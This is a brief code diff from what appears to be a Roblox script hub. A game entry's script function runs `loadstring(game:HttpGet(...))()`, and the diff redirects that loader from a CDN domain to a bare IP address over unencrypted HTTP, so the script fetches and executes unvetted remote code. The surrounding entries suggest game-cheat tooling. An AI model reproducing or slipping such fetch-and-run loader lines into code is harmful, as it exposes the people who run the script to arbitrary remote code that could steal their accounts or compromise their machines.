@@ -21,8 +21,8 @@ local gameInfo = {
             "Some pets boost your farming speed."
         },
         script = function()
-            local ID = "e2249ae4-0580-4b0f-8289-87f460b363d6"
-            loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
+            loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
         end
     },
     [8737899170] = { -- Pet Simulator 99
